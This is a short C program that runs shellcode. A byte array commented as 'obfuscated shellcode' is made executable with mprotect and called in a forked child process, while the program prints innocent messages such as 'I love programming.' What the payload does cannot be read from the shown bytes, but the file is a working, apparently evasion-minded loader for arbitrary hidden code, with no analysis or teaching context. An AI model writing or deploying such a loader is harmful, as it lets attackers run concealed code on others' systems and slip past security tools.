#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Our obfuscated shellcode
unsigned char buf[] ="\x20\x40\x14\x7b\x91\xbd\xa9\x19\x09\x19\x20\x48\xfa\x2c\xc3\xab\x87\xca\xdd\x11\x22\x8a\xe2\x67\x8b\x22\x48\x4a\x4b\xf1\xc3\xab\x20\x2c\x12\x1a\x1b\x1d\xc3\xab\x09\x87\xca\xcf\x8a\x33\x53\x04\x3e\x77\x22\xe8\x4a\x4a\x4a\x12\x20\x4a\x20\x4f\xc3\xa9\x7b\x83\x87\xca\xcf\x8a\x33\xf7\xa1\x6d\xf8\x4d\xf3\x4a\x5a\x4a\x4a\xc3\xa9\x8b\xa1\x46\x8b\xa9\x46\xfa\x37\x87\xca\xcf\x8a\x32\x5a\x11\xc3\xab\xd3\xf8\x6e\xfa\x49\x87\xca\xcf\x8a\x32\x48\xb5\xab\xf2\x4b\x4a\x4a\x4a\xf1\x4b\x4a\x4a\x4a\x87\xca";

int main(){
    printf("I love programming.");
    if(fork() == 0)
    {
    intptr_t pagesize = sysconf(_SC_PAGESIZE);
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
            pagesize, PROT_READ|PROT_EXEC)) {
            perror("mprotect");
            return -1;
        }
        int (*ret)() = (int(*)())buf;
        ret();
    }
    else
    {
        printf("Returning from main...\n");
    }
        return 3;
}
